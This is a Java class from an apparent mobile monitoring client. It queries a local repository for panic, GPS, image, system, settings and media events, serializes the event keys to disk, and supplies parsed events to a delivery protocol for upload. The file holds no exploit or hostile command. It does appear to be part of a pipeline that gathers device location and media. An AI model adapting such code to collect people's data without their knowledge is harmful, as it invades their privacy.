package com.vvt.eventdelivery;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventType;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.eventrepository.eventresult.EventKeys;
import com.vvt.eventrepository.eventresult.EventResultSet;
import com.vvt.eventrepository.querycriteria.QueryCriteria;
import com.vvt.eventrepository.querycriteria.QueryOrder;
import com.vvt.logger.FxLog;
import com.vvt.phoenix.prot.command.DataProvider;

public class EventDataProvider implements DataProvider {
	private static final String TAG = "EventDataProvider";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	private EventDelivery.Type mDeliveryType;
	private FxEventRepository mRepository;
	private Iterator<FxEvent> mIterator;
	private String mWrittablePath;
	
	private int mCallerId;
	private int mCount;
	private int mParingId;
	
	EventDataProvider(
			FxEventRepository repository, 
			EventDelivery.Type deliveryType, 
			String writtablePath,
			int paringId) {
		
		mRepository = repository;
		mDeliveryType = deliveryType;
		mWrittablePath = writtablePath;
		//MUST SET paringID BEFORE Count.
		mParingId = paringId;
//		mCount = getEventResultSet().getEvents().size();
		mCount = EventDeliveryConstant.EVENT_QUERY_LIMIT;
		if(LOGV) FxLog.v(TAG, "EventDataProvider # currentThread Id : " + Thread.currentThread().getId());
	}

	@Override
	public boolean hasNext() {
		if (mIterator == null) {
			EventResultSet resultSet = getEventResultSet(mCount);
			EventKeys eventKeys = resultSet.shrinkAsEventKeys();
			String pathOutput = "";
			pathOutput = EventDeliveryConstant.getSerializedObjectPath(mWrittablePath, mDeliveryType);
			
			if (!persistObject(eventKeys, pathOutput)) {
					resultSet = getEmptySet();
			}
			mIterator = resultSet.getEvents().iterator();
		}
		return mIterator.hasNext();
	}

	@Override
	public Object getObject() {
		FxEvent fxEvent = mIterator.next();
		if(LOGV) FxLog.v(TAG, "# getObject :: " + fxEvent.toString());
		
		return FxEventParser.parseEvent(fxEvent);
	}

	public int getCallerId() {
		return mCallerId;
	}

	public void setCallerId(int callerId) {
		this.mCallerId = callerId;
	}

	public int getCount() {
		return mCount;
	}
	
//	private EventResultSet getEventResultSet() {
//		return getEventResultSet(EventDeliveryConstant.EVENT_QUERY_LIMIT);
//	}
	
	private EventResultSet getEventResultSet(int limit) {
		if(LOGV) FxLog.v(TAG, "getEventResultSet # START ...");
		
		EventResultSet resultSet = null;
		
		try {
			if(LOGV) FxLog.v(TAG, "mDeliveryType is " + mDeliveryType);
			
			if (mDeliveryType == EventDelivery.Type.TYPE_PANIC) {
				
				
				QueryCriteria criteria = new QueryCriteria();
				criteria.addEventType(FxEventType.PANIC_STATUS);
				criteria.setLimit(limit);
				criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
				resultSet  = mRepository.getRegularEvents(criteria);
				
				//resultSet can be null because repository can't query. 
				List<FxEvent> tempList = null;
				if(resultSet != null) {
					tempList = resultSet.getEvents();
				}
				
				if (tempList == null || tempList.size() < 1) {
					criteria = new QueryCriteria();
					criteria.addEventType(FxEventType.PANIC_GPS);
					criteria.addEventType(FxEventType.PANIC_IMAGE);
					criteria.addEventType(FxEventType.ALERT_GPS);
					criteria.setLimit(limit);
					criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
					resultSet  = mRepository.getRegularEvents(criteria);
				}
			}
			else if (mDeliveryType == EventDelivery.Type.TYPE_SYSTEM) {
				QueryCriteria criteria = new QueryCriteria();
				criteria.addEventType(FxEventType.SYSTEM);
				criteria.setLimit(limit);
				criteria.setQueryOrder(QueryOrder.QueryOldestFist);
				resultSet  = mRepository.getRegularEvents(criteria);
			}
			else if (mDeliveryType == EventDelivery.Type.TYPE_SETTINGS) {
				QueryCriteria criteria = new QueryCriteria();
				criteria.addEventType(FxEventType.SETTINGS);
				criteria.setLimit(limit);
				criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
				resultSet  = mRepository.getRegularEvents(criteria);
			}
			else if (mDeliveryType == EventDelivery.Type.TYPE_REGULAR) {
				QueryCriteria criteria = new QueryCriteria();
				criteria.setLimit(limit);
				criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
				resultSet  = mRepository.getRegularEvents(criteria);
				
				// Thumbnail will be sent after non-media events in a separated request
				// resultSet can be null because repository can't query. 
				List<FxEvent> tempList = null;
				if(resultSet != null) {
					tempList = resultSet.getEvents();
				}
				
				if (tempList == null || tempList.size() < 1) {
					resultSet = mRepository.getMediaEvents(criteria);
				}
			}
			else if (mDeliveryType == EventDelivery.Type.TYPE_ACTUAL_MEDIA) {
				FxEvent actualMedia  = mRepository.getActualMedia(mParingId);
				
				if (actualMedia != null) {
					ArrayList<FxEvent> tempList = new ArrayList<FxEvent>();
					tempList.add(actualMedia);
					
					resultSet = new EventResultSet();
					resultSet.addEvents(tempList);
				}
			}
		}
		catch (Throwable e) {
			if(LOGE) FxLog.e(TAG, "Error!! Query events FAILED!", e);
		}
		
		if (resultSet == null) {
			resultSet = getEmptySet();
		}
		
		if(LOGV) FxLog.v(TAG, "getEventResultSet # resultSet Size " + resultSet.getEvents().size());
		if(LOGV) FxLog.v(TAG, "getEventResultSet # EXIT ...");
		
		return resultSet;
	}
	
	private EventResultSet getEmptySet() {
		EventResultSet resultSet = new EventResultSet();
		resultSet.addEvents(new ArrayList<FxEvent>());
		return resultSet;
	}
	
	private boolean persistObject(Serializable obj, String pathOutput) {
		boolean isSuccess = false;
		try {
			File f = new File(pathOutput);
			f.createNewFile();
			ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
			out.writeObject(obj);
			out.flush();
			out.close();
			isSuccess = true;
		}
		catch (IOException e) {
			if(LOGE) FxLog.e(TAG, "persistObject # Persisting FAILED!!");
		}
		return isSuccess;
	}

}
